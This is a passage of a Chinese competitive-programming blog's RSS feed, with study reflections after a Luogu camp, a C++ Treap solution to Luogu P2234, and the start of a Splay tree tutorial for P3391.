            <pubDate>Wed, 28 Feb 2018 22:56:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;洛谷春令营结束不久，就我个人而言实在是收益良多。&lt;br&gt;课后与洛谷的讲师们略有交谈，并且稍微接触了别地的信竞生，顿感弱小……决定把一些了解到的信息和感想放在这里。比较杂，将就着看吧。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;首先说下近年竞赛的发展吧。&lt;br&gt;近年信息学竞赛带来的升学优势增大了不少，机会增加了，这是好事。但这同样也意味着竞争将激烈许多。&lt;br&gt;举几个例子：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;浙江小学便培育“种子选手”，浙江初赛分数线一度达到90分。  &lt;/li&gt;
&lt;li&gt;著名的南山中学，C类买不停，此处不细说。  &lt;/li&gt;
&lt;li&gt;很大一部分选手以完全停课备战比赛。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;切实参与到竞赛中，能感觉到许多学校已经为此疯狂了。究其原因是签约机会变多了。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NOIP获得极高分有几率提前签  &lt;/li&gt;
&lt;li&gt;冬令营&amp;#x2F;夏令营（WC&amp;#x2F;SC）  &lt;/li&gt;
&lt;li&gt;APIO  &lt;/li&gt;
&lt;li&gt;省选  &lt;/li&gt;
&lt;li&gt;NOI  &lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;C9大学竞相甩出了不少一本线录取的约。相比于裸考省TOP100（福建）才有希望进PKU&amp;#x2F;THU，降至一本线录取无疑是捷径。难怪众多学校为其“疯狂”……&lt;br&gt;在我看到了雅礼中学、南山中学、福师大附中、福州三中、长郡中学、杭州二中等等强校的成绩后，我才发现我们已经落后太多了。好在初一起步，现在冲刺还有很大希望。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;于是要注意什么呢？  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;持之以恒的练习。中考在即，许多人完全将C++甩开，全力备战中考。个人认为此举不妥。中考在6月下旬，然而11月份便是新一次NOIp了。如果3月~6月整整一个季度不写代码，绝对会手生了。此时想要回到从前的状态可能要很久。因此学业压力不大的可以考虑每天抽出时间想题、做题，周末打比赛。学习成绩不甚稳定的，每周也应该做个2、3题，保持感觉。其实现在看来我们只剩下2次NOIp的机会了，必须好好把握。  &lt;/li&gt;
&lt;li&gt;有明确的TODO-List。信息学知识点比较繁杂，难度差异大，各种算法、数据结构比赛出现频率差距悬殊。于是在学习完某些内容之后，重点、热点趁热打铁，简单的运用几次。但是学习什么呢？可以参考《算法竞赛入门经典——训练指南》的目录。列出清单，逐一击破，此时再去刷综合题，效果一定好不少。  &lt;/li&gt;
&lt;li&gt;多打比赛。一次次的比赛中，我们可以练好心态，学好骗分，把握节奏。随便去问一个大牛“去哪里打比赛好？”，95%的都会告诉你：Codeforces。其特色的赛制很能达到以上目的。如果没空怎么办呢（CF比赛多在深夜）？可以打洛谷的月赛，经过审核的公开赛。平常做题时，对于每道题，都应该使劲动脑，试着去使劲骗分，看看能得到多少（优秀的骗分往往能拿到70分以上，非常重要！比如模拟退火、爬山算法）。之后试图编写正解，30min没有明确思路，再去看题解。  &lt;/li&gt;
&lt;li&gt;懂得总结套路。尤其是DP状态设计、DP优化、搜索剪枝……等等。刷题多了自然有经验，但是要善于总结。  &lt;/li&gt;
&lt;li&gt;多接触他地市的选手、神犇，他们会很乐意帮助的。你甚至可以迅速的得到短期计划、大量内部材料……  &lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;竞赛具体内容相关：&lt;br&gt;联赛常考：&lt;br&gt;&lt;img src=&#34;https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180228225459264-75959639.png&#34; loading=&#34;lazy&#34;&gt;  &lt;/p&gt;
&lt;p&gt;模拟题多是理所当然。但是DP的位置如此重要之前确实没想到，DP很看刷题量。数论需要一定的知识积累，初中生学起来可能较难，但是简单的手动找规律很有帮助。大部分比赛搜索枚举暴力写的好，剪枝剪得多就能直接Au。练好基本功很重要（所以多打比赛！）。&lt;br&gt;计算几何在省选、NOI中考的较多，不可不学。三维几何什么的就算了吧目前……&lt;br&gt;学会静态调试。先别急着输出中间变量，肉眼先仔细找找有没有错误，考场这样能有效提高效率，防止心态崩。&lt;br&gt;搜索枚举使劲剪枝，保证结果正确的情况下并且有充足时间使劲常数优化。竞赛中，好的常数优化有时胜过理论复杂度下降一个等级。&lt;br&gt;先写暴力，再写一般正解。这样还可以拿着2个程序挂后台对拍，既保证了基础得分，又为效率更高的方法提供了正确性保障。注意边界数据手动检验。&lt;br&gt;技巧可能有许多许多，此处是说不完的。在此推荐几个网站：&lt;br&gt;Codeforces.com&lt;br&gt;hzwer.com&lt;br&gt;顺带一提，洛谷的题解常常讲的比博客还好……&lt;br&gt;信息学竞赛贵在坚持，没有题量一切都是空谈，在机房里打游戏、逛知乎都是不妥的。&lt;br&gt;时间不多了。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20[HNOI2002]%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/</guid>
            <title>洛谷:P2234  [HNOI2002]营业额统计</title>
            <link>http://cubicy.icu/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20[HNOI2002]%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/</link>
            <category>Treap</category>
            <pubDate>Tue, 27 Feb 2018 23:58:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址：&lt;a href=&#34;//www.luogu.org/problemnew/show/P2234&#34;&gt;https://www.luogu.org/problemnew/show/P2234&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;给定一个序列，对于每一个数都要查询：序列中在这个数前与这个数最接近的数是什么？然后将最接近的数字与这个数字的差累加。（序列第一个数字直接加自己）  &lt;/p&gt;
&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;查询在这个数之前与这个数最接近的数，我们很容易想到用二叉搜索树（BST）来做。&lt;br&gt;&lt;del&gt;虽然数据略水暴力排序每次查询从一个数往左右找也能过。&lt;/del&gt;&lt;br&gt;每次插入一个数字，然后查询，我用Treap实现（还是弱化版的，只有插入查询）。&lt;br&gt;Treap的核心其实就是打乱顺序插入防止被卡（粗糙理解）。具体实现方法不难，请百度。（我之后会写一篇专门介绍下各种BST的。）&lt;br&gt;PS：Treap树完整版之后写。这题用STL的vector也行，vector理论每次插入渐进时间复杂度是O(n)但是听说实际是对数级别的？   &lt;/p&gt;
&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstdlib&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cmath&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;randad&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; seed=&lt;span class=&#34;number&#34;&gt;114&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//seed可以随便取&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; seed=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(seed*&lt;span class=&#34;number&#34;&gt;48271LL&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;2147483647&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//48271使得其有完全周期，即2147483647内取遍不重复 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Treap&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; key,pri,son[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;T[&lt;span class=&#34;number&#34;&gt;33333&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cnt=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,rt=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;rotate&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; p,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;rt)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y=T[rt].son[p];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T[rt].son[p]=T[y].son[!p];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T[y].son[!p]=rt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rt=y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ins&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; key,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;rt)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(rt==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	T[rt=cnt++] = (Treap)&amp;#123;key,&lt;span class=&#34;built_in&#34;&gt;randad&lt;/span&gt;()&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; p=key&amp;gt;T[rt].key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(key,T[rt].son[p]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(T[T[rt].son[p]].pri&amp;gt;T[rt].pri)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        	&lt;span class=&#34;built_in&#34;&gt;rotate&lt;/span&gt;(p,rt);   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;nowMin&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; key,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; rt)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//查询现在最接近key的数&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(rt==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;666666666&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; res=&lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(key-T[rt].key);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(key&amp;gt;T[rt].key) res=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(res,&lt;span class=&#34;built_in&#34;&gt;nowMin&lt;/span&gt;(key,T[rt].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(key&amp;lt;T[rt].key) res=&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(res,&lt;span class=&#34;built_in&#34;&gt;nowMin&lt;/span&gt;(key,T[rt].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; res;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n,tot=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=n;i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; num;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;num);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (i==&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) tot+=num;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; tot+=&lt;span class=&#34;built_in&#34;&gt;nowMin&lt;/span&gt;(num,rt);&lt;span class=&#34;comment&#34;&gt;//rt是当前根&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(num,rt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,tot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/</guid>
            <title>洛谷:P3391 【模板】文艺平衡树（Splay）</title>
            <link>http://cubicy.icu/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/</link>
            <category>Splay</category>
            <pubDate>Thu, 22 Feb 2018 23:43:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址:&lt;a href=&#34;//www.luogu.org/problemnew/show/P3391&#34;&gt;https://www.luogu.org/problemnew/show/P3391&lt;/a&gt;  &lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;您需要写一种数据结构（可参考题目标题），来维护一个有序数列，其中需要提供以下操作：&lt;br&gt;翻转一个区间，例如原有序序列是5 4 3 2 1，翻转区间是[2,4]的话，结果是5 2 3 4 1&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;Splay是一种二叉搜索树。如果不知道的话……    &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172651966-1911354100.png&#34; alt=&#34;百度啊&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;百度百科对BST的介绍：  &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;二叉查找树（Binary Search Tree），（又：二叉搜索树，二叉排序树）它或者是一棵空树，或者是具有下列性质的二叉树： 若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 它的左、右子树也分别为二叉排序树。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先明白Splay比起线段树能多干什么：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可以在一个有序序列中任意数后面动态插入一串数（不能比a后面一个数还大）  &lt;/li&gt;
&lt;li&gt;可以删除一段区间&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可能描述不是很清楚，具体看这里面给的论文链接：&lt;a href=&#34;//www.cnblogs.com/yyy2015c01/p/8457795.html&#34;&gt;信息学竞赛相关优秀文章合集&lt;/a&gt;&lt;br&gt;或者直接看这里：&lt;a href=&#34;//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf&#34;&gt;运用伸展树解决数列维护问题.pdf&lt;/a&gt;&lt;br&gt;如果搞不懂左旋右旋是什么，可以先看&lt;a href=&#34;//www.cnblogs.com/yyy2015c01/p/8457795.html&#34;&gt;信息学竞赛相关优秀文章合集&lt;/a&gt;里的AVL树介绍。&lt;br&gt;对于AVL树是一种为了防止树结构不够优导致深度过深时间复杂度退化，在保持二叉搜索树性质不变的前提下进行的一种变换。简单说就是把往一边沉的树弄的两边平衡些。&lt;br&gt;而在Splay中，将特定点旋转到一定位置可以进行提取区间等操作，同时各种旋转间接的使树**基本平衡(是的，可以构造数据卡掉。Treap树对此表示同情)**。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;左旋（下面代码里的表达:把S往上转一次）→&lt;img src=&#34;https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235430206-1994690340.gif&#34; alt=&#34;左旋&#34; loading=&#34;lazy&#34;&gt;  &lt;/p&gt;
&lt;hr&gt;
